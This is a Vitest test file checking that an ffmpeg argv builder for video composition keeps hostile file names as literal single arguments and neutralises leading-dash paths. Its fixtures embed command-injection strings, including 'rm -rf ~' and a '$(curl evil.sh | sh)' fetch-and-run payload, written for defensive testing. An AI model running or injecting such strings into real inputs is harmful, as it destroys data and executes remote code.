import { describe, expect, it } from "vitest";
import { buildComposeArgv } from "../../../src/adapters/compose/compose-argv.js";
import type { ComposeParams } from "../../../src/domain/ports/platform-profile.js";

const baseParams: ComposeParams = {
  rawClip: { path: "clip.mp4", durationMs: 1000, aspectRatio: "16:9" },
  audioTracks: [{ segmentId: "seg-1", path: "seg-1.mp3", durationMs: 1000 }],
  subtitles: [{ text: "Let's log in.", startMs: 0, durationMs: 1000 }],
};

describe("buildComposeArgv — argv-array process boundary safety", () => {
  it("passes filenames with shell metacharacters through as literal single argv items", () => {
    const malicious = "clip.mp4; rm -rf ~ | $(touch pwned) `touch pwned2` and spaces.mp4";
    const params: ComposeParams = {
      ...baseParams,
      rawClip: { ...baseParams.rawClip, path: malicious },
    };
    const argv = buildComposeArgv(params, "subs.srt", "out.mp4");

    // The malicious string must appear as EXACTLY ONE array element, byte-for-byte, never split
    // on whitespace/metacharacters (which would happen if this were ever shell-interpolated).
    expect(argv).toContain(malicious);
    expect(argv.filter((arg) => arg === malicious)).toHaveLength(1);
    // No shell metacharacter token leaked out into a separate argv slot (would prove splitting).
    expect(argv).not.toContain("rm");
    expect(argv).not.toContain("-rf");
    expect(argv).not.toContain("touch");
  });

  it("passes audio and output paths containing shell metacharacters through as literal single argv items", () => {
    const maliciousAudio = "$(curl evil.sh | sh).mp3";
    const maliciousOutput = "out `id`.mp4";
    const params: ComposeParams = {
      ...baseParams,
      audioTracks: [{ segmentId: "seg-1", path: maliciousAudio, durationMs: 1000 }],
    };
    const argv = buildComposeArgv(params, "subs.srt", maliciousOutput);

    expect(argv).toContain(maliciousAudio);
    expect(argv.at(-1)).toBe(maliciousOutput);
  });

  it("neutralizes a leading-dash output filename so it cannot be parsed as an ffmpeg flag", () => {
    const argv = buildComposeArgv(baseParams, "subs.srt", "-oevil.mp4");

    // Never emit a bare leading-dash positional path: ffmpeg's own argv parser could otherwise
    // treat it as an unrecognized option instead of a filename.
    expect(argv).not.toContain("-oevil.mp4");
    expect(argv.at(-1)).toBe("./-oevil.mp4");
  });

  it("neutralizes a leading-dash input path (raw clip, audio, subtitles) the same way", () => {
    const params: ComposeParams = {
      ...baseParams,
      rawClip: { ...baseParams.rawClip, path: "-x.mp4" },
      audioTracks: [{ segmentId: "seg-1", path: "-y.mp3", durationMs: 1000 }],
    };
    const argv = buildComposeArgv(params, "-subs.srt", "out.mp4");

    expect(argv).not.toContain("-x.mp4");
    expect(argv).not.toContain("-y.mp3");
    expect(argv).not.toContain("-subs.srt");
    expect(argv).toContain("./-x.mp4");
    expect(argv).toContain("./-y.mp3");
    expect(argv).toContain("./-subs.srt");
  });

  it("builds correct argv for a single-track YouTube 16:9 compose", () => {
    const argv = buildComposeArgv(baseParams, "subs.srt", "final.mp4");

    expect(argv).toEqual([
      "-y",
      "-i",
      "clip.mp4",
      "-i",
      "seg-1.mp3",
      "-i",
      "subs.srt",
      "-filter_complex",
      "[1:a]concat=n=1:v=0:a=1[aout]",
      "-map",
      "0:v",
      "-map",
      "[aout]",
      "-map",
      "2:s",
      "-c:v",
      "libx264",
      "-c:a",
      "aac",
      "-c:s",
      "mov_text",
      "-shortest",
      "final.mp4",
    ]);
  });

  it("builds correct argv for a multi-track compose, concatenating audio inputs in order", () => {
    const params: ComposeParams = {
      ...baseParams,
      audioTracks: [
        { segmentId: "seg-1", path: "seg-1.mp3", durationMs: 1000 },
        { segmentId: "seg-2", path: "seg-2.mp3", durationMs: 1500 },
      ],
    };
    const argv = buildComposeArgv(params, "subs.srt", "final.mp4");

    expect(argv).toEqual([
      "-y",
      "-i",
      "clip.mp4",
      "-i",
      "seg-1.mp3",
      "-i",
      "seg-2.mp3",
      "-i",
      "subs.srt",
      "-filter_complex",
      "[1:a][2:a]concat=n=2:v=0:a=1[aout]",
      "-map",
      "0:v",
      "-map",
      "[aout]",
      "-map",
      "3:s",
      "-c:v",
      "libx264",
      "-c:a",
      "aac",
      "-c:s",
      "mov_text",
      "-shortest",
      "final.mp4",
    ]);
  });
});
